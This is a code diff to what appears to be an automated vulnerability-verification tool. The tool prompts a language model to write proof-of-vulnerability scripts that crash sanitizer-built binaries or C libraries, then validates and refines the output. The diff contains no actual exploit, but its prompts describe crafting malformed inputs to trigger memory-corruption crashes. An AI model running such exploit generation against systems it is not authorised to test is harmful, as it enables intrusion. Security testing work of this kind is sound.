+            if _is_lib_harness_gen:
+                _rule6 = (
+                    "6. This is a C LIBRARY target — there is NO prebuilt binary. "
+                    "   You MUST write an inline C harness, compile it with "
+                    "   clang -fsanitize=address,undefined -O0 -g harness.c -I/workspace/codebase -lLIBNAME, "
+                    "   and run the resulting binary. The harness must call the vulnerable library function directly.\n"
+                )
+            else:
+                _rule6 = (
+                    "6. The target binary is ALREADY BUILT with AddressSanitizer by the harness. "
+                    "   Do NOT use clang/gcc/cc to compile or link anything inside the PoV script. "
+                    "   Do NOT write compile_cmd, link_cmd, or any subprocess call to a compiler. "
+                    "   Simply invoke TARGET_BINARY with the correct subcommand and crafted input.\n"
+                )
             sys_msg = (
                 "You are a security researcher writing a Proof-of-Vulnerability (PoV) script. "
                 f"Output ONLY: (1) a ```json proof-plan block, then (2) a ```{pov_language} script block. "
@@ -3155,10 +4569,24 @@ if __name__ == '__main__':
                 "3. For file-parsing vulnerabilities: create a crafted malformed file and pass it as input.\n"
                 "4. For buffer overflows: pass oversized or malformed string/binary arguments.\n"
                 "5. For CLI tools: use a real subcommand with data that reaches the vulnerable function.\n"
-                "6. The target binary is ALREADY BUILT with AddressSanitizer by the harness. "
-                "   Do NOT use clang/gcc/cc to compile or link anything inside the PoV script. "
-                "   Do NOT write compile_cmd, link_cmd, or any subprocess call to a compiler. "
-                "   Simply invoke TARGET_BINARY with the correct subcommand and crafted input.\n"
+                + _rule6 +
+                "7. SUBPROCESS HANDLING: When using subprocess.run(), either:\n"
+                "   a) Use text=True and access result.stdout/result.stderr as strings directly (NO .decode())\n"
+                "   b) OR omit text=True and use result.stdout.decode('utf-8', errors='replace')\n"
+                "   NEVER mix text=True with .decode() — this causes AttributeError.\n"
+                "   When passing binary input with text=True, decode it first: input=payload.decode('latin-1').\n"
+                "8. TARGET_BINARY ACCESS: Always use os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN').\n"
+                "   NEVER use os.environ['TARGET_BINARY'] (brackets) — the key may not exist.\n"
+                "   NEVER redeclare TARGET_BINARY inside any function.\n"
+                "9. CRASH PROOFS: Do NOT print \"VULNERABILITY TRIGGERED\" for crash-type vulnerabilities "
+                "   (buffer overflow, use-after-free, etc.). The oracle detects crashes from ASan output, "
+                "   exit codes (134=SIGABRT, 139=SIGSEGV), and core dumps automatically. "
+                "   Your ONLY job is to craft input that TRIGGERS the actual crash. "
+                "   Call sys.exit(result.returncode) to propagate the crash exit code.\n"
+                "10. BEHAVIORAL PROOFS: Print ONLY the SPECIFIC evidence markers from the exploit "
+                "    contract's observable_evidence list (e.g. FILE_CREATED_OUTSIDE_ALLOWED_DIR, "
+                "    INSECURE_PERMISSION, SENSITIVE_DATA_LEAKED). Do NOT print generic strings like "
+                "    \"VULNERABILITY TRIGGERED\" — the oracle matches specific markers only.\n"
                 "/no_think"
             )
             messages = [
@@ -3210,12 +4638,33 @@ if __name__ == '__main__':
                 except (json.JSONDecodeError, ValueError):
                     proof_plan_dict = None
             # ───────────────────────────────────────────────────────────
-            parsed = self._parse_pov_payload(raw_response, cwe_type, explanation, vulnerable_code, filepath=filepath)
-            pov_script = parsed["pov_script"]
+            # Strip the JSON proof-plan block from raw_response so
+            # _parse_pov_payload sees only the Python/script code block.
+            # Without this, the parser JSON-decodes the proof plan
+            # successfully but finds no pov_script field, returning empty.
+            _response_for_parse = raw_response
+            if plan_match:
+                _response_for_parse = (
+                    raw_response[:plan_match.start()]
+                    + raw_response[plan_match.end():]
+                ).strip()
+            # Log raw response snippet for debugging extraction issues
+            import logging as _log_gen_parse
+            _log_gen_parse.getLogger('autopov.generate').info(
+                f"Raw response length={len(raw_response)}, "
+                f"proof_plan_found={'yes' if plan_match else 'no'}, "
+                f"response_for_parse (first 300): {_response_for_parse[:300]!r}"
+            )
+            parsed = self._parse_pov_payload(_response_for_parse, cwe_type, explanation, vulnerable_code, filepath=filepath)
+            pov_script = self._postprocess_pov_script(parsed["pov_script"])
             if not pov_script.strip():
                 fallback = self._synthesize_native_library_fallback_pov(cwe_type, filepath, vulnerable_code, explanation, normalized_contract, runtime_feedback=runtime_feedback)
                 if fallback:
                     return fallback
+                # FIX-7: Try multi-language scaffold fallback for non-native targets
+                _ml_fallback = self._synthesize_fallback_pov(pov_language, cwe_type, filepath, vulnerable_code, explanation, normalized_contract)
+                if _ml_fallback:
+                    return _ml_fallback
                 raise VerificationError("Model did not return executable PoV code")
             exploit_contract = self._normalize_exploit_contract(parsed["exploit_contract"] or normalized_contract, cwe_type, explanation, vulnerable_code, filepath=filepath)
             # Attach proof plan and its validation issues to the contract for downstream use
@@ -3246,7 +4695,7 @@ if __name__ == '__main__':
             if not pov_script.strip():
                 raise VerificationError("Model did not return executable PoV code")
             
-            end_time = datetime.utcnow()
+            end_time = datetime.now(timezone.utc)
             generation_time = (end_time - start_time).total_seconds()
             
             return {
@@ -3265,10 +4714,21 @@ if __name__ == '__main__':
             }
             
         except Exception as e:
+            import traceback as _tb_gen
+            import logging as _log_gen
+            _log_gen.getLogger('autopov.generate').error(
+                f"generate_pov exception: {e}\n{_tb_gen.format_exc()}"
+            )
             fallback = self._synthesize_native_library_fallback_pov(cwe_type, filepath, vulnerable_code, explanation, normalized_contract if 'normalized_contract' in locals() else exploit_contract, runtime_feedback=runtime_feedback)
             if fallback:
                 return fallback
-            end_time = datetime.utcnow()
+            # FIX-7: Try multi-language scaffold fallback for non-native targets
+            _pov_lang = locals().get('pov_language') or 'python'
+            _nc = normalized_contract if 'normalized_contract' in locals() else exploit_contract
+            _ml_fallback = self._synthesize_fallback_pov(_pov_lang, cwe_type, filepath, vulnerable_code, explanation, _nc)
+            if _ml_fallback:
+                return _ml_fallback
+            end_time = datetime.now(timezone.utc)
             # Preserve the raw model response so the caller can attempt salvage
             # (e.g. extract a ```python block even when JSON parsing failed).
             _raw = locals().get('raw_response') or ''
@@ -3334,6 +4794,15 @@ if __name__ == '__main__':
         if syntax_error:
             result["is_valid"] = False
             result["issues"].append(f"Syntax error: {syntax_error}")
+            return result
+
+        # --- Pre-execution bug detection (catches common LLM-generated mistakes) ---
+        common_bugs = self._detect_common_pov_bugs(pov_script)
+        if common_bugs:
+            result["is_valid"] = False
+            result["issues"].extend(common_bugs)
+            result["will_trigger"] = "NO"
+            result["validation_method"] = "static_bug_detection"
             return result
 
         consistency_issues = self._contract_runtime_consistency_issues(pov_script, exploit_contract or {}, filepath, cwe_type, vulnerable_code=vulnerable_code)
@@ -3468,10 +4937,20 @@ if __name__ == '__main__':
                 result["issues"].append(f"Syntax error: {syntax_check.get('error') or 'JavaScript syntax error'}")
                 return result
 
-        # Check 2: Must contain an observable proof marker
-        if "VULNERABILITY TRIGGERED" not in pov_script and "alert(" not in pov_script:
+        # Check 2: Must contain an observable proof marker or crash propagation
+        # For crash proofs: sys.exit(result.returncode) propagates crash signals
+        # For behavioral proofs: specific evidence markers (FILE_CREATED_OUTSIDE_ALLOWED_DIR, etc.)
+        # For JS proofs: alert() or console output
+        _has_crash_propagation = 'sys.exit(result.returncode)' in pov_script or 'sys.exit(r.returncode)' in pov_script
+        _has_specific_marker = any(m in pov_script for m in (
+            'FILE_CREATED_OUTSIDE_ALLOWED_DIR', 'INSECURE_PERMISSION', 'SENSITIVE_DATA_LEAKED',
+            'EXCEPTION_TRIGGERED', 'TIMING_ANOMALY', 'RESOURCE_EXHAUSTION',
+        ))
+        _has_generic_marker = 'VULNERABILITY TRIGGERED' in pov_script
+        _has_js_marker = 'alert(' in pov_script
+        if not (_has_crash_propagation or _has_specific_marker or _has_generic_marker or _has_js_marker):
             result["is_valid"] = False
-            result["issues"].append("Missing required observable proof marker")
+            result["issues"].append("Missing required observable proof marker — add sys.exit(result.returncode) for crash proofs or specific evidence markers for behavioral proofs")
 
         # Check 3: Only standard library imports for Python PoVs
         disallowed_imports = []
@@ -3728,6 +5207,7 @@ if __name__ == '__main__':
         exploit_contract: Optional[Dict[str, Any]] = None,
         runtime_feedback: Optional[Dict[str, Any]] = None,
         probe_context: str = '',
+        recon_report: Optional[Dict[str, Any]] = None,
     ) -> Dict[str, Any]:
         """
         Refine a failed PoV script based on validation errors
@@ -3749,7 +5229,7 @@ if __name__ == '__main__':
         Returns:
             Dictionary with refined PoV script and metadata
         """
-        start_time = datetime.utcnow()
+        start_time = datetime.now(timezone.utc)
         # Merge passed-in runtime_feedback into the contract's existing feedback
         # so known_subcommands / observed_surface reach _normalize_exploit_contract.
         effective_runtime_feedback = dict(runtime_feedback or {})
@@ -3822,7 +5302,25 @@ if __name__ == '__main__':
                 subcommands=normalized_contract.get('known_subcommands') or None,
                 probe_context=probe_context or '',
                 observed_surface=(effective_runtime_feedback or {}).get('observed_surface') or {},
+                recon_report=recon_report,
             )
+            # ── Non-crash proof type: inject forceful behavioral verification guidance (refinement) ──
+            _ref_proof_strategy = normalized_contract.get('proof_strategy') or {}
+            _ref_proof_type = str(_ref_proof_strategy.get('proof_type', '')).strip().lower()
+            _ref_non_crash = ('behavioral_deviation', 'state_change', 'information_disclosure',
+                              'observable_output', 'exception', 'timing_difference', 'resource_exhaustion')
+            if _ref_proof_type in _ref_non_crash:
+                _ref_obs_ev = _ref_proof_strategy.get('observable_evidence', [])
+                prompt = prompt.rstrip() + (
+                    f"\n\nCRITICAL — NON-CRASH PROOF TYPE ({_ref_proof_type}): "
+                    "This vulnerability does NOT produce a crash. Do NOT check for AddressSanitizer, SIGSEGV, or SIGABRT. "
+                    "After invoking the binary, perform POST-EXECUTION VERIFICATION: "
+                    "check filesystem state (os.path.exists, os.stat for permissions), output content, or side effects. "
+                    f"The oracle expects these EXACT markers in stdout: {_ref_obs_ev}. "
+                    "You MUST print these exact strings when the vulnerability condition is confirmed. "
+                    "Example: if os.path.exists(suspect_path): print('FILE_CREATED_OUTSIDE_ALLOWED_DIR:' + suspect_path)\n"
+                    "If verification confirms the vulnerability, also print 'VULNERABILITY TRIGGERED' as the final line."
+                )
             llm = self._get_llm(model_name, purpose="refinement")
 
             # Build a language-enforcement system message. If the previous attempt failed
@@ -3844,7 +5342,14 @@ if __name__ == '__main__':
                 f"Write {_refine_lang_label} code only — never switch the PoV language."
                 f"{_lang_correction} "
                 "Do NOT use --help, --version, or bare binary invocation. "
-                "Do NOT redeclare TARGET_BINARY, TARGET_BIN, or CODEBASE_PATH inside any function."
+                "CRITICAL: NEVER re-assign TARGET_BINARY or TARGET_BIN inside any function or main(). "
+                "The variable is already defined at module level from the harness. "
+                "Use it directly: `binary = TARGET_BINARY` or `subprocess.run([TARGET_BINARY, ...])`. "
+                "If you must assign locally, add `global TARGET_BINARY` at the top of the function. "
+                "Do NOT shadow the module-level variable. "
+                "MANDATORY: Before outputting the new PoV, write a CHANGELOG section listing every line "
+                "you modified and why. This forces you to actually fix the bug instead of repeating "
+                "the same broken code. If the CHANGELOG is empty, you have failed."
                 " /no_think"
             )
             messages = [
@@ -3856,7 +5361,7 @@ if __name__ == '__main__':
             # Strip <think> blocks before parsing (qwen3/reasoning models)
             raw_refine_response = self._strip_think_blocks(response.content)
             parsed = self._parse_pov_payload(raw_refine_response, cwe_type, explanation, vulnerable_code, filepath=filepath)
-            pov_script = parsed["pov_script"]
+            pov_script = self._postprocess_pov_script(parsed["pov_script"])
             if not str(pov_script or '').strip():
                 raise VerificationError("Model did not return executable PoV code")
             refined_contract_seed = self._merge_refined_contract(normalized_contract, parsed["exploit_contract"] or {})
@@ -3877,12 +5382,13 @@ if __name__ == '__main__':
                 pov_script = pov_script.split("```")[1].split("```")[0].strip()
             pov_script = self._strip_language_prefix(pov_script)
             
-            end_time = datetime.utcnow()
+            end_time = datetime.now(timezone.utc)
             generation_time = (end_time - start_time).total_seconds()
             
             return {
                 "success": True,
                 "pov_script": pov_script,
+                "pov_language": _refine_pov_lang,
                 "refinement_time_s": generation_time,
                 "timestamp": end_time.isoformat(),
                 "model_used": model_name or llm._autopov_model_name,
@@ -3895,10 +5401,16 @@ if __name__ == '__main__':
             }
             
         except Exception as e:
-            end_time = datetime.utcnow()
+            import traceback as _tb_refine
+            import logging as _log_refine
+            _log_refine.getLogger('autopov.refine').error(
+                f"refine_pov exception: {e}\n{_tb_refine.format_exc()}"
+            )
+            end_time = datetime.now(timezone.utc)
             return {
                 "success": False,
                 "error": str(e),
+                "traceback": _tb_refine.format_exc(),
                 "pov_script": failed_pov,  # Return original on failure
                 "refinement_time_s": (end_time - start_time).total_seconds(),
                 "timestamp": end_time.isoformat()
